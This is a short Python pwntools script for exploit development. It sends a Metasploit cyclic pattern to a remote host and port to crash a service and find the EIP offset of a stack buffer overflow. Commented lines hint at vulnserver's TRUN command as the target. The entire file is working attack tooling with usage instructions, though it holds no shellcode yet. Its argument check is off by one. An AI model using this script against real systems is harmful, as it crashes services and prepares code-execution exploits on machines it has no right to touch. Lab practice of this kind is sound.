#!/usr/bin/python3


import socket
import sys
import time
from pwn import *  # pwntools
#apt-get update
#apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
#python3 -m pip install --upgrade pip
#python3 -m pip install --upgrade pwntools

if len(sys.argv) < 3:
    #LHOST, LPORT, BYTES AT WHICH YOUR PROGRAM CRASHED
    print("\nUsage: " +
          sys.argv[0] + " <HOST> <PORT> $(msf-pattern_create -l <LENGTH NEEDED>) \n")
    sys.exit()

host = sys.argv[1]
port = sys.argv[2]
offset = sys.argv[3]


try:
    # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # s.connect((host,port))
    p = remote(host, port)  # connect to host
    
    # p.sendline('TRUN /.:/' + offset) #send payload (here being the unique string generated from pattern_offset.rb)
    p.sendline(offset)
    print("Sent evil buffer >:) Check your debugger for the EIP")
	
    # s.send(('TRUN /.:/' + offset))  #change TRUN
    # s.close()
except:
    print("Error connecting to server")
    sys.exit()
